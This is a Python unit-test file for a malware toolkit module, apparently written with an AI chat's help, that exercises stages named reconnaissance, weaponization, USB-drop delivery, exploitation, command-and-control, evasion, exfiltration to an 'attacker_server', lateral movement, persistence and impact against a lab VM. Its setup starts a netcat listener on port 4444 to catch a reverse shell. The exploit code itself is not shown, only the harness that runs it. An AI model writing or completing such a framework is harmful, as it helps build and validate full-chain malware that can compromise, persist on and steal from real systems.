import unittest
import os
import platform
import subprocess
import shutil  # For directory cleanup (use with caution!)
from malware_attacks import MalwareAttack  # Import your main class
from attack_logger import AttackLogger
import time

class MalwareAttackTest(unittest.TestCase):
    def setUp(self):
        self.logger = AttackLogger()
        self.logger.start_new_log("test_attack")  # Start logging for the test run
        self.malware = MalwareAttack()
        self.recon = self.malware.Recon()
        self.weaponization = self.malware.Weaponization()
        self.delivery = self.malware.Delivery()
        self.exploitation = self.malware.Exploitation()
        self.post_exploitation = self.malware.PostExploitation()
        self.c2 = self.malware.C2()
        self.evasion = self.malware.EvasionObfuscation()
        self.exfiltration = self.malware.Exfiltration()
        self.lateral_movement = self.malware.LateralMovement()
        self.persistence = self.malware.Persistence()
        self.impact = self.malware.Impact()

        # Set test target and listener info (REPLACE with your VM IPs)
        self.test_target_ip = "192.168.1.101"  # Replace with your target VM's IP
        self.test_listener_ip = "192.168.1.100"  # Replace with your attacker VM's IP
        self.test_listener_port = 4444  # Choose an available port

        self.exploitation.set_target(self.test_target_ip, self.test_target_ip)
        self.post_exploitation.set_target(self.test_target_ip, self.test_target_ip)
        self.c2.set_target(self.test_target_ip, self.test_listener_ip, self.test_listener_port)
        self.exfiltration.set_target(self.test_target_ip, "attacker_server")  # Replace if needed
        self.lateral_movement.set_target(self.test_target_ip)
        self.persistence.set_target(self.test_target_ip)
        self.impact.set_target(self.test_target_ip)

        # Create test directory and dummy scripts (as before)
        self.test_dir = "test_environment" # Create it manually
        if not os.path.exists(self.test_dir):
            os.makedirs(self.test_dir)

        # ... (all the dummy script creation code from the previous response)

        # Start a netcat listener in a separate process (attacker VM)
        self.nc_process = None
        try:
            self.nc_process = subprocess.Popen(["nc", "-lvp", str(self.test_listener_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(1) # Give it time to start
        except FileNotFoundError:
            self.fail("netcat (nc) not found. Install it on your attacker VM.")
        except Exception as e:
            self.fail(f"Error starting netcat listener: {e}")

    def tearDown(self):
        # Stop the netcat listener (attacker VM)
        if self.nc_process:
            self.nc_process.terminate()
            self.nc_process.wait()
            # Optionally get output for debugging
            # stdout, stderr = self.nc_process.communicate()
            # print("netcat stdout:", stdout.decode())
            # print("netcat stderr:", stderr.decode())

        # Clean up the test environment (use with extreme caution!)
        # shutil.rmtree(self.test_dir)  # Uncomment ONLY when you're absolutely sure
        pass  # Commented out for safety during development


    def test_recon(self):
        self.assertIsNone(self.recon.perform_recon())  # Check if it runs without crashing for now

    def test_weaponization(self):
        self.weaponization.attack_map = {"test_attack": self.dummy_script}  # Use the dummy script
        self.weaponization.deploy_malware("test_attack")
        
        if platform.system() == "Windows":
             test_file_path = os.path.join(os.environ["TEMP"], "payload_success.txt")
        else:
            test_file_path = "/tmp/payload_success.txt"

        self.assertTrue(os.path.exists(test_file_path))  # Check if the payload was executed

    def test_delivery(self):
        self.delivery.usb_path = self.test_dir
        payload_path = self.delivery.generate_payload()
        if payload_path:
            self.delivery.usb_dropping()
            self.assertTrue(os.path.exists(os.path.join(self.test_dir, payload_path)))
        else:
            self.fail("Payload generation failed.")

    def test_exploitation(self):
        # Test exploitation (replace with actual exploits when ready)
        self.exploitation.run_all_exploits()  # Replace with more specific tests later

    def test_post_exploitation(self):
        self.post_exploitation.run_post_exploitation()  # Test if it runs

    def test_c2(self):
        # Test C2 functionality (replace with actual server/client logic later)
        self.c2.run_c2_operations()  # Basic test if it runs

    def test_evasion(self):
        self.evasion.run_evasion()

    def test_exfiltration(self):
        self.exfiltration.exfiltrate_data()

    def test_lateral_movement(self):
        self.lateral_movement.run_lateral_movement()

    def test_persistence(self):
        self.persistence.run_persistence()

    def test_impact(self):
        self.impact.run_impact()


if __name__ == "__main__":
    unittest.main()